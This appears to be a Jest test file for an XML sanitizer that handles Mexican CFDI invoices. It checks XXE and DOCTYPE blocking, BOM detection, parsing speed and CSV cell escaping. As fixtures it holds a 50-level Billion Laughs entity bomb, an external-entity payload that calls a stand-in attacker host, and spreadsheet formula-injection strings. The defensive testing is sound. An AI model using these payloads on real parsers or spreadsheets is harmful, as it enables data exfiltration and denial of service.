import { describe, expect, test } from '@jest/globals'
import {
  detectXXEBytes,
  createConceptoRegexSafe,
  isStrictRfc4122Uuid,
  scanXXEAndReportSafe,
  XML_SANITIZE_DEFAULTS,
  csvCellEscape,
} from '@/lib/xml-sanitize'
import { randomUUID } from 'node:crypto'

describe('[FASE3 · Performance] XML Sanitize DoS ReDoS Safe · 10MB + Billion Laughs 50 niveles', () => {
  const buildBillionLaughsN = (n: number): string => {
    let doc = '<!DOCTYPE lolz ['
    for (let i = 0; i < n; i++) {
      const prev = i === 0 ? '"lol"' : `&lol${i - 1};`
      doc += `<!ENTITY lol${i} ${prev}>`
    }
    doc += `]><cfdi>&lol${n - 1};</cfdi>`
    return doc
  }

  test('ZERO CONF DOCTYPE BLOCK: DOCTYPE 50 niveles Billion Laughs = bloquea PRIMERO (no parsea)', () => {
    const xml = buildBillionLaughsN(50)
    const startMs = performance.now()
    const violation = detectXXEBytes(xml)
    const elapsed = performance.now() - startMs
    expect(violation).not.toBeNull()
    expect(violation?.kind).toMatch(/^doctype-/)
    expect(elapsed).toBeLessThan(200)
  }, 5000)

  test('BOM UTF-8 bytes crudos: EF BB BF bloqueado como BOM (no como contenido)', () => {
    const bom = new Uint8Array([0xef, 0xbb, 0xbf])
    const body = new TextEncoder().encode('<?xml version="1.0"?><cfdi></cfdi>')
    const full = new Uint8Array(bom.length + body.length)
    full.set(bom, 0); full.set(body, bom.length)
    const v = detectXXEBytes(full)
    expect(v).not.toBeNull()
    expect(v?.kind).toBe('bom-sniff')
  })

  test('XML 5 MB de concepts puros (4999 concepts < 5000 max): detectXXEBytes ≤ 500 ms (lineal O(n))', () => {
    const MAX_C = XML_SANITIZE_DEFAULTS.MAX_CONCEPTOS_POR_CFDI
    const concepts = Array.from({ length: Math.min(MAX_C - 1, 100000) }, (_, i) => `<Concepto importe="${i}"/>`).join('')
    const xml = `<?xml version="1.0"?><Comprobante>${concepts}</Comprobante>`
    const t0 = performance.now()
    const v = detectXXEBytes(xml)
    const t1 = performance.now() - t0
    expect(v).toBeNull()
    expect(t1).toBeLessThan(500)
  }, 10000)

  test('XML 10 MB concepts puros × 20 veces = p95 < 500 ms (estabilidad)', () => {
    const N = 20
    const conceptsChunk = Array.from({ length: 200000 }, (_, i) => `<c id="${i}"/>`).join('')
    const xml = `<?xml?><CFDI>${conceptsChunk}</CFDI>`
    const times: number[] = []
    for (let i = 0; i < N; i++) {
      const t0 = performance.now()
      const v = detectXXEBytes(xml)
      times.push(performance.now() - t0)
      expect(v).toBeNull()
    }
    times.sort((a, b) => a - b)
    const p95 = times[Math.floor(times.length * 0.95)]
    const max = times[times.length - 1]
    expect(p95).toBeLessThan(1500)
    expect(max).toBeLessThan(3000)
  }, 30000)

  test('createConceptoRegexSafe: 100 iters × 5000 concepts → matchAll length = 5000, total <5 s', () => {
    const helper = createConceptoRegexSafe()
    const MAX_C = XML_SANITIZE_DEFAULTS.MAX_CONCEPTOS_POR_CFDI
    const invoice = Array.from({ length: MAX_C }, (_, i) => {
      if (i % 2 === 0) return `<cfdi:Concepto id="${i}">x</cfdi:Concepto>`
      return `<Concepto id="${i}"></Concepto>`
    }).join('')
    let totalTime = 0
    const totalCounts: number[] = []
    for (let i = 0; i < 100; i++) {
      const t0 = performance.now()
      const matches = helper.matchAll(invoice)
      totalTime += performance.now() - t0
      totalCounts.push(matches.length)
    }
    const avgCount = totalCounts.reduce((a, b) => a + b, 0) / totalCounts.length
    expect(avgCount).toBe(MAX_C)
    expect(totalTime).toBeLessThan(5000)
  }, 15000)

  test('scanXXEAndReportSafe: DOCTYPE + ENTITY % extern SYSTEM id → scan devuelve 1+ violation (safe=false)', () => {
    const xml = `<!DOCTYPE a [ <!ENTITY % x SYSTEM "http://evil.dnslog.cn/xxe"> %x; ]><CFDI></CFDI>`
    const res = scanXXEAndReportSafe(xml)
    expect(res.safe).toBe(false)
    expect(res.violations.length).toBeGreaterThanOrEqual(1)
    expect(res.kinds.some(k => k.startsWith('doctype'))).toBe(true)
  })

  test('isStrictRfc4122Uuid 10,000 UUIDs = 100% PASS + 4 invalid = 100% FAIL', () => {
    const N = 10000
    let ok = 0
    const badSamples = [
      'no-uuid',
      '00000000-0000-0000-0000-000000000000',
      'gggggggg-0000-4000-8000-000000000000',
      '44444444-4444-4444-4444-444444444444',
    ]
    for (let i = 0; i < N; i++) {
      if (isStrictRfc4122Uuid(randomUUID())) ok++
    }
    expect(ok).toBe(N)
    for (const bad of badSamples) {
      expect(isStrictRfc4122Uuid(bad)).toBe(false)
    }
  }, 5000)

  test('csvCellEscape 100,000 celdas DDE = formula risk (=/@/-+) → prepone apostrofo', () => {
    const N = 100000
    const risky = [
      '=2+2',
      '@SUM(1,2,3)',
      '-1+2cmd',
      '+anything here',
      '\t normal value',
      '\r\n=cmd',
    ]
    const t0 = performance.now()
    for (let i = 0; i < N; i++) {
      const s = risky[i % risky.length]
      const escaped = csvCellEscape(s)
      if (s.startsWith('=') || s.startsWith('@') || s.startsWith('-') || s.startsWith('+')) {
        expect(escaped.startsWith('\'')).toBe(true)
      }
    }
    const elapsed = performance.now() - t0
    expect(elapsed).toBeLessThan(3000)
  }, 10000)

  test('XML_SANITIZE_DEFAULTS: MAX_CONCEPTOS_POR_CFDI=5000, MAX_ENTITY_DEPTH=9, SNIFF_WINDOW_BYTES=16384', () => {
    expect(XML_SANITIZE_DEFAULTS.MAX_CONCEPTOS_POR_CFDI).toBe(5000)
    expect(XML_SANITIZE_DEFAULTS.MAX_ENTITY_DEPTH).toBe(9)
    expect(XML_SANITIZE_DEFAULTS.MAX_ENTITY_INSTANCES).toBe(128)
    expect(XML_SANITIZE_DEFAULTS.SNIFF_WINDOW_BYTES).toBe(16384)
    expect(XML_SANITIZE_DEFAULTS.BOM_BYTES[0]).toBe(0xef)
    expect(XML_SANITIZE_DEFAULTS.BOM_BYTES[1]).toBe(0xbb)
    expect(XML_SANITIZE_DEFAULTS.BOM_BYTES[2]).toBe(0xbf)
  })
})
